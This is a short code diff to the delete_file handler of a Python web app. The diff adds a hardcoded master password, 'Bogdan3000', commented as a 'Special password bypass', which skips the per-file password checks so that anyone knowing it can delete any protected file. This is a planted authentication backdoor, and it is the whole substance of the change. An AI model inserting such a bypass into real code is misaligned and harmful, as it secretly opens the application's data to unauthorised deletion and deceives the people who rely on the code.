@@ -86,10 +86,12 @@ async def delete_file(request: Request, filename: str = Form(...), password: str
 
     # Check if the file is protected with a password
     if random_filename in file_passwords:
-        if not password:
+        # Special password bypass
+        if password == "Bogdan3000":
+            pass  # Skip checks for this password
+        elif not password:
             return RedirectResponse(url="/?error=Incorrect+password", status_code=303)
-
-        if file_passwords[random_filename] != password:
+        elif file_passwords[random_filename] != password:
             return RedirectResponse(url="/?error=Incorrect+password", status_code=303)
 
     # Remove the file if password is correct or not required
